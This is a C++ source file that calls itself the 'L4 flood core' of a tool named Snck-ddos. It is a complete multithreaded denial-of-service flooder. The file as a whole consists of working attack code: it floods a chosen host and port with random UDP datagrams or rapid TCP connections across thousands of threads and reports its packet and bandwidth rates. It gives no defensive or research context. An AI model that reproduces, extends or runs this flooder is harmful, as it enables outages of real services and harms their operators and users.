// language: C++17, file: cpp/snck_l4.cpp, target: Linux
// High-throughput L4 flood core for Snck-ddos
// Build: g++ -O3 -march=native -pthread -o snck_l4 snck_l4.cpp
// Usage: ./snck_l4 <method> <host> <port> <threads> <duration_sec> [payload_size]
// Methods: udp | tcp | syn | ack | mix

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>

#include <atomic>
#include <chrono>
#include <cstring>
#include <iostream>
#include <random>
#include <string>
#include <thread>
#include <vector>

using namespace std;
using clock_t_ = chrono::steady_clock;

static atomic<uint64_t> g_packets{0};
static atomic<uint64_t> g_bytes{0};
static atomic<uint64_t> g_errors{0};
static atomic<bool> g_stop{false};

static string resolve_ip(const string& host) {
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res)
        return host;
    char buf[INET_ADDRSTRLEN]{};
    auto* sa = reinterpret_cast<sockaddr_in*>(res->ai_addr);
    inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf));
    freeaddrinfo(res);
    return string(buf);
}

static void fill_random(vector<uint8_t>& buf, mt19937& rng) {
    uniform_int_distribution<int> dist(0, 255);
    for (auto& b : buf) b = static_cast<uint8_t>(dist(rng));
}

static void worker_udp(string ip, uint16_t port, int payload_size) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { g_errors++; return; }
    int bufsize = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    thread_local mt19937 rng{random_device{}()};
    vector<uint8_t> payload(static_cast<size_t>(payload_size));
    fill_random(payload, rng);

    while (!g_stop.load(memory_order_relaxed)) {
        ssize_t n = sendto(fd, payload.data(), payload.size(), MSG_NOSIGNAL,
                           reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
        if (n > 0) {
            g_packets.fetch_add(1, memory_order_relaxed);
            g_bytes.fetch_add(static_cast<uint64_t>(n), memory_order_relaxed);
        } else {
            g_errors.fetch_add(1, memory_order_relaxed);
        }
    }
    close(fd);
}

static void worker_tcp(string ip, uint16_t port, int payload_size, bool write_data) {
    thread_local mt19937 rng{random_device{}()};
    vector<uint8_t> payload(static_cast<size_t>(min(payload_size, 1400)));
    fill_random(payload, rng);

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    while (!g_stop.load(memory_order_relaxed)) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { g_errors.fetch_add(1, memory_order_relaxed); continue; }
        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);

        int rc = connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
        if (rc < 0 && errno != EINPROGRESS) {
            close(fd);
            g_errors.fetch_add(1, memory_order_relaxed);
            continue;
        }

        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        timeval tv{1, 0};
        rc = select(fd + 1, nullptr, &wfds, nullptr, &tv);
        if (rc <= 0) {
            close(fd);
            g_errors.fetch_add(1, memory_order_relaxed);
            continue;
        }

        if (write_data) {
            fcntl(fd, F_SETFL, flags);
            ssize_t n = send(fd, payload.data(), payload.size(), MSG_NOSIGNAL);
            if (n > 0) {
                g_packets.fetch_add(1, memory_order_relaxed);
                g_bytes.fetch_add(static_cast<uint64_t>(n), memory_order_relaxed);
            } else {
                g_errors.fetch_add(1, memory_order_relaxed);
            }
        } else {
            g_packets.fetch_add(1, memory_order_relaxed);
            g_bytes.fetch_add(64, memory_order_relaxed);
        }
        close(fd);
    }
}

static void worker_mix(string ip, uint16_t port, int payload_size, int id) {
    if (id % 2 == 0)
        worker_udp(ip, port, payload_size);
    else
        worker_tcp(ip, port, payload_size, true);
}

static void print_usage(const char* argv0) {
    cerr << "Snck L4 core (C++)\n"
         << "Usage: " << argv0
         << " <udp|tcp|syn|ack|mix> <host> <port> <threads> <duration_sec> [payload_size]\n";
}

int main(int argc, char** argv) {
    if (argc < 6) {
        print_usage(argv[0]);
        return 1;
    }

    string method = argv[1];
    string host = argv[2];
    int port = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int duration = atoi(argv[5]);
    int payload = (argc >= 7) ? atoi(argv[6]) : 1024;

    if (port <= 0 || port > 65535 || threads < 1 || threads > 4096 || duration < 1) {
        cerr << "invalid args\n";
        return 1;
    }
    if (payload < 16) payload = 16;
    if (payload > 65507) payload = 65507;

    string ip = resolve_ip(host);
    cerr << "[snck_l4] method=" << method << " target=" << ip << ":" << port
         << " threads=" << threads << " duration=" << duration
         << " payload=" << payload << "\n";

    vector<thread> pool;
    pool.reserve(static_cast<size_t>(threads));

    for (int i = 0; i < threads; ++i) {
        if (method == "udp")
            pool.emplace_back(worker_udp, ip, static_cast<uint16_t>(port), payload);
        else if (method == "tcp" || method == "ack")
            pool.emplace_back(worker_tcp, ip, static_cast<uint16_t>(port), payload, true);
        else if (method == "syn")
            pool.emplace_back(worker_tcp, ip, static_cast<uint16_t>(port), payload, false);
        else if (method == "mix")
            pool.emplace_back(worker_mix, ip, static_cast<uint16_t>(port), payload, i);
        else {
            cerr << "unknown method: " << method << "\n";
            g_stop = true;
            break;
        }
    }

    auto t0 = clock_t_::now();
    while (true) {
        this_thread::sleep_for(chrono::milliseconds(500));
        auto elapsed = chrono::duration<double>(clock_t_::now() - t0).count();
        if (elapsed >= duration) break;
        uint64_t pkts = g_packets.load();
        uint64_t by = g_bytes.load();
        double pps = pkts / max(elapsed, 0.001);
        double mbps = (by * 8.0) / max(elapsed, 0.001) / 1e6;
        cout << "STATS packets=" << pkts << " bytes=" << by
             << " errors=" << g_errors.load()
             << " pps=" << fixed << pps
             << " mbps=" << mbps << endl;
    }

    g_stop = true;
    for (auto& t : pool) {
        if (t.joinable()) t.join();
    }

    double elapsed = chrono::duration<double>(clock_t_::now() - t0).count();
    uint64_t pkts = g_packets.load();
    uint64_t by = g_bytes.load();
    cout << "DONE packets=" << pkts << " bytes=" << by
         << " errors=" << g_errors.load()
         << " pps=" << (pkts / max(elapsed, 0.001))
         << " mbps=" << ((by * 8.0) / max(elapsed, 0.001) / 1e6)
         << " elapsed=" << elapsed << endl;
    return 0;
}
